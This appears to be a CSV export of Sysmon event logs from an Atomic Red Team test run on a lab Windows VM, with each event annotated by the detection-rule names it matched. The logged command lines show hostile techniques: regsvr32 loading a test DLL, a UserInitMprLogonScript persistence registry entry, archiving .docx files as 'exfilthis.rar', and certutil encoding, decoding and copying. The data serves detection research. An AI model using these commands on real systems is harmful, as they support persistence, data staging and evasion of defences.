2019-07-19T14:53:46.565529+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4042,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 7148
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D97A-5D31-0000-001089BD3800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:46.405
"
2019-07-19T14:53:46.848703+00:00,Hacktool - EDR-Freeze Execution;Regsvr32 Execution From Highly Suspicious Location;Scripting/CommandLine Process Spawned Regsvr32;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4044,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=CE09FA2A1DD10D0F675A1F0513F3C4EE4D7C3AC0,MD5=4D97D6FC07642D4F744C8C59DB674302,SHA256=E0E722A00C127E0425D2078E738B7A684C9F55A9BF521C67E9A40D796C8BE0E9,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 3564
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D97A-5D31-0000-00109DDC3800
CommandLine: '""C:\Windows\syswow64\regsvr32.exe"" /s C:\AtomicRedTeam\atomics\T1117\bin\AllTheThingsx86.dll'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:46.831
"
2019-07-19T14:53:46.893188+00:00,Hacktool - EDR-Freeze Execution;Regsvr32 Execution From Highly Suspicious Location;Scripting/CommandLine Process Spawned Regsvr32;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4045,MSEDGEWIN10,"Image: C:\Windows\System32\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=FC99212A5F929D707AF49E8151CAB1E30FF658EB,MD5=DA0E9A7777D16AE18BD9C642A9F42223,SHA256=F098FA150D9199732B4EC2E81528A951503A30F75AFEBF7E7A48360301758C67,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 5828
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D97A-5D31-0000-001019DE3800
CommandLine: '""C:\Windows\system32\regsvr32.exe"" /s C:\AtomicRedTeam\atomics\T1117\bin\AllTheThingsx86.dll'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:46.867
"
2019-07-19T14:53:46.975169+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4046,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4628
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D97A-5D31-0000-00102BE33800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c  IF %%PROCESSOR_ARCHITECTURE%% ==AMD64  ELSE  '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:46.938
"
2019-07-19T14:53:47.083068+00:00,Hacktool - EDR-Freeze Execution;Regsvr32 Execution From Highly Suspicious Location;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4047,MSEDGEWIN10,"Image: C:\Windows\SysWOW64\regsvr32.exe
RuleName: ''
Description: Microsoft(C) Register Server
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\regsvr32.exe"" /s C:\AtomicRedTeam\atomics\T1117\bin\AllTheThingsx86.dll'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5828
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=CE09FA2A1DD10D0F675A1F0513F3C4EE4D7C3AC0,MD5=4D97D6FC07642D4F744C8C59DB674302,SHA256=E0E722A00C127E0425D2078E738B7A684C9F55A9BF521C67E9A40D796C8BE0E9,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8
ParentProcessGuid: 747F3D96-D97A-5D31-0000-001019DE3800
ProcessId: 5788
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D97B-5D31-0000-00109DEB3800
CommandLine: ' /s C:\AtomicRedTeam\atomics\T1117\bin\AllTheThingsx86.dll'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\regsvr32.exe
UtcTime: 2019-07-19 14:53:47.056
"
2019-07-19T14:53:47.239318+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4048,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6888
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D97B-5D31-0000-0010F0F03800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:47.230
"
2019-07-19T14:53:54.976854+00:00,Hacktool - EDR-Freeze Execution;Potential Persistence Via Logon Scripts - CommandLine;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4049,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4240
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D982-5D31-0000-0010DC633900
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "" cmd.exe'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:53:54.968
"
2019-07-19T14:53:55.018275+00:00,Hacktool - EDR-Freeze Execution;Potential Persistence Via Logon Scripts - CommandLine;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4050,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "" cmd.exe'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4240
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D982-5D31-0000-0010DC633900
ProcessId: 3608
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D983-5D31-0000-00102E663900
CommandLine: REG.exe  ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d  cmd.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:53:55.010
"
2019-07-19T14:54:01.925833+00:00,Common Autorun Keys Modification;Potential Persistence Via Logon Scripts - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,4051,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Environment\UserInitMprLogonScript
RuleName: ''
EventType: SetValue
ProcessId: 3608
ProcessGuid: 747F3D96-D983-5D31-0000-00102E663900
UtcTime: 2019-07-19 14:54:01.900
Details: Binary Data
"
2019-07-19T14:54:01.955256+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4052,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4944
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D989-5D31-0000-0010FC7B3900
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:54:01.940
"
2019-07-19T14:54:16.782667+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4053,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2000
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D998-5D31-0000-001008B43900
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""rar a -r exfilthis.rar *.docx""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:54:16.766
"
2019-07-19T14:54:16.830063+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4054,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2424
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D998-5D31-0000-00101BB73900
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:54:16.818
"
2019-07-19T14:57:03.235828+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4061,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4832
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DA3F-5D31-0000-00104C173C00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""certutil.exe -encode c:\file.exe file.txt""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:57:03.223
"
2019-07-19T14:57:03.309488+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4062,MSEDGEWIN10,"Image: C:\Windows\System32\certutil.exe
RuleName: ''
Description: CertUtil.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""certutil.exe -encode c:\file.exe file.txt""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4832
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=459D928381CDDFDC31D03C3DA5C28E63B1190194,MD5=535CF1F8E8CF3382AB8F62013F967DD8,SHA256=85DD6F8EDF142F53746A51D11DCBA853104BB0207CDF2D6C3529917C3C0FC8DF,IMPHASH=683B8A445B00A271FC57848D893BD6C4
ParentProcessGuid: 747F3D96-DA3F-5D31-0000-00104C173C00
ProcessId: 1260
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DA3F-5D31-0000-00109E193C00
CommandLine: certutil.exe  -encode c:\file.exe file.txt
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:57:03.261
"
2019-07-19T14:57:03.961276+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4063,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4020
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DA3F-5D31-0000-0010562E3C00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""certutil.exe -decode file.txt c:\file.exe""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:57:03.786
"
2019-07-19T14:57:03.974754+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4064,MSEDGEWIN10,"Image: C:\Windows\System32\certutil.exe
RuleName: ''
Description: CertUtil.exe
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""certutil.exe -decode file.txt c:\file.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4020
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=459D928381CDDFDC31D03C3DA5C28E63B1190194,MD5=535CF1F8E8CF3382AB8F62013F967DD8,SHA256=85DD6F8EDF142F53746A51D11DCBA853104BB0207CDF2D6C3529917C3C0FC8DF,IMPHASH=683B8A445B00A271FC57848D893BD6C4
ParentProcessGuid: 747F3D96-DA3F-5D31-0000-0010562E3C00
ProcessId: 6888
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DA3F-5D31-0000-001022323C00
CommandLine: certutil.exe  -decode file.txt c:\file.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:57:03.818
"
2019-07-19T14:57:04.210561+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4065,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 7140
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DA3F-5D31-0000-0010813E3C00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:57:03.938
"
2019-07-19T14:57:04.270645+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;LOL-Binary Copied From System Directory;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4066,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6572
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DA40-5D31-0000-00106A543C00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""cmd.exe /c copy %%windir%%\\system32\\certutil.exe %%temp%%tcm.tmp""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:57:04.236
"
2019-07-19T14:57:04.294575+00:00,Hacktool - EDR-Freeze Execution;LOL-Binary Copied From System Directory;Operator Bloopers Cobalt Strike Commands;Potentially Suspicious CMD Shell Output Redirect;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4067,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6572
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DA40-5D31-0000-00106A543C00
ProcessId: 5168
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DA40-5D31-0000-0010B1553C00
CommandLine: cmd.exe  /c copy C:\Windows\\system32\\certutil.exe C:\Users\IEUser\AppData\Local\Temptcm.tmp
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:57:04.256
"
2019-07-19T14:57:04.333864+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4068,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4336
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DA40-5D31-0000-0010CF5A3C00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""cmd.exe /c %%temp%%tcm.tmp -decode c:\file.exe file.txt""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:57:04.316
"
